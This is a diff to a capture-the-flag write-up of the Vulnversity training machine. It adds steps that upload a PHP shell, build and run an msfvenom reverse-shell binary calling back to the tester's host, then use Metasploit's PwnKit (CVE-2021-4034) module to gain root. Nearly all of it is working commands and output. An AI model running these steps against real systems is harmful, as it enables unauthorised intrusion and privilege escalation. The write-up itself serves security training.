@@ -17,6 +17,9 @@ Date: I already solved this machine on Dec 24 2020 (!!!); I am doing it again wi
 - [Brute force with Burpsuite](#brute-force-with-burpsuite)
 - [Brute force with ZAP](#brute-force-with-zap)
 - [User flag](#user-flag)
+- [Meterpreter Session](#meterpreter-session)
+- [Suggester](#suggester)
+- [Root Flag](#root-flag)
 
 ## nmap
 
@@ -196,7 +199,7 @@ let's inspect first the upload form:
 cURL command:
 
 ```bash
-$ $ curl -F 'file=@/home/joshua/Documents/thm/vulnversity/shell.php;filename=rofl.phtml' http://10.10.206.250:3333/internal/index.php
+$ curl -F 'file=@/home/joshua/Documents/thm/vulnversity/shell.php;filename=rofl.phtml' http://10.10.206.250:3333/internal/index.php
 <html>
 <head>
 <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
@@ -324,3 +327,160 @@ www-data@vulnuniversity:/var/www/html$ ls /home/bill/
 user.txt
 ```
 
+## meterpreter session
+
+```
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.100.14 LPORT=5555 -f elf -o shell.elf
+```
+
+Upload to target with Python webserver:
+
+```
+joshua@kaligra:~/Documents/thm/vulnversity$ python3 -m http.server 8888
+Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
+10.10.118.58 - - [01/Jul/2023 15:25:05] "GET /shell.elf HTTP/1.1" 200 -
+```
+
+Start `msfconsole` handler:
+
+```
+msfconsole -x "use multi/handler;set payload linux/x86/meterpreter/reverse_tcp; set lhost tun0; set lport 5555; exploit"
+```
+
+```
+[*] Starting persistent handler(s)...
+[*] Using configured payload generic/shell_reverse_tcp
+payload => linux/x86/meterpreter/reverse_tcp
+lhost => tun0
+lport => 4444
+[*] Started reverse TCP handler on 10.8.100.14:5555
+```
+
+Trigger payload:
+
+```
+www-data@vulnuniversity:/tmp$ chmod +x shell.elf
+chmod +x shell.elf
+www-data@vulnuniversity:/tmp$ ./shell.elf
+./shell.elf
+```
+
+We receive shell:
+
+```
+[*] Sending stage (1017704 bytes) to 10.10.38.94
+[*] Meterpreter session 1 opened (10.8.100.14:5555 -> 10.10.38.94:39544) at 2023-07-01 16:17:15 +0200
+
+meterpreter >
+```
+
+## suggester
+
+```
+meterpreter > bg
+[*] Backgrounding session 1...
+msf6 exploit(multi/handler) > use suggester
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank    Check  Description
+   -  ----                                      ---------------  ----    -----  -----------
+   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
+
+
+Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester
+
+[*] Using post/multi/recon/local_exploit_suggester
+msf6 post(multi/recon/local_exploit_suggester) > set session 1
+session => 1
+```
+
+```
+msf6 post(multi/recon/local_exploit_suggester) > run
+
+[*] 10.10.38.94 - Collecting local exploits for x86/linux...
+[*] 10.10.38.94 - 176 exploit checks are being tried...
+[+] 10.10.38.94 - exploit/linux/local/bpf_sign_extension_priv_esc: The target appears to be vulnerable.
+[+] 10.10.38.94 - exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec: The target is vulnerable.
+[*] Running check method for exploit 14 / 53
+..
+..
+```
+
+We will use `cve_2021_4034_pwnkit_lpe_pkexec`.
+
+```
+msf6 post(multi/recon/local_exploit_suggester) > use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
+msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > options
+
+Module options (exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   PKEXEC_PATH                    no        The path to pkexec binary
+   SESSION                        yes       The session to run this module on
+   WRITABLE_DIR  /tmp             yes       A directory where we can write files
+
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.0.2.8         yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   x86_64
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) >
+```
+
+```
+msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set LPORT 6666
+LPORT => 6666
+msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set LHOST tun0
+LHOST => 10.8.100.14
+msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set payload linux/x64/shell_reverse_tcp
+payload => linux/x64/shell_reverse_tcp
+msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set SESSION 1
+SESSION => 1
+```
+
+Run!
+
+## root flag
+
+```
+msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > run
+
+[*] Started reverse TCP handler on 10.8.100.14:6666
+[*] Running automatic check ("set AutoCheck false" to disable)
+[!] Verify cleanup of /tmp/.ohjicuha
+[+] The target is vulnerable.
+[*] Writing '/tmp/.shaouaund/ompkonpncmg/ompkonpncmg.so' (492 bytes) ...
+[!] Verify cleanup of /tmp/.shaouaund
+[!] Tried to delete /tmp/.ohjicuha/.mroanjse, unknown result
+[+] Deleted /tmp/.shaouaund/ompkonpncmg/ompkonpncmg.so
+[+] Deleted /tmp/.shaouaund/.frakzskbiuxj
+[!] Tried to delete /tmp/.ohjicuha, unknown result
+[!] Tried to delete /tmp/.ohjicuha, unknown result
+[+] Deleted /tmp/.shaouaund
+[!] Tried to delete /tmp/.shaouaund, unknown result
+[*] Command shell session 2 opened (10.8.100.14:6666 -> 10.10.38.94:37650) at 2023-07-01 16:25:26 +0200
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+import pty;pty.spawn("/bin/bash");'
+root@vulnuniversity:/#
+root@vulnuniversity:/# cat root/root.txt
+cat root/root.txt
+a58ff8579f0a9270368d33a9966c7fd5
+```
